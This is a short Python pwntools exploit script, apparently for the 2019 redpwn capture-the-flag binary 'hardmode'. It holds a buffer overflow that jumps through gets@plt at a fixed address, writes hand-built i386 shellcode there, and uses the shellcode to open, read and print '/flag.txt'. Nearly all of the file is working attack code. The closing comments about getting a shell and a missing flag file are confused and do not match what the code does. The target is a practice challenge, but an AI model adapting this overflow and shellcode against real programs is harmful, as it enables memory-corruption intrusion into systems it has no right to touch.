from pwn import *

"/fla g.tx t"
a = u32("/fla")
b = u32("g.tx")
c = u32("t\x00\x00\x00")

shellcode  = asm("push " + str(c))
shellcode += asm("push " + str(b))
shellcode += asm("push " + str(a))

shellcode += asm("""
mov eax, 0x5
mov ebx, esp
mov ecx, 0x0
mov edx, 0x0
int 0x80

mov ebx, eax
mov eax, 0x3
mov ecx, esp
mov edx, 41
int 0x80

mov eax, 0x4
mov ebx, 0x1
mov ecx, esp
mov edx, 41
int 0x80

""")


def exploit():
	io = process("./hardmode")
	#io = remote("chall.2019.redpwn.net", 4002)

	buff      = 0x804a020
	gets_plt  = 0x080483b0


	global shellcode

	io.recvuntil("Welcome to my fiendish little challenge\n")

	payload  = 'A'*34
	payload += p32(gets_plt)
	payload += p32(buff)
	payload += p32(buff)
	
	
	io.sendline(payload)
	io.sendline("exit")
	io.sendline(shellcode)
	print io.recvall()
	io.close()

#there is no need to this exploit
#just cat the flag.txt when u get shell..
#this is actually the flag ...
#cat: flag.txt: No such file or directory
exploit()
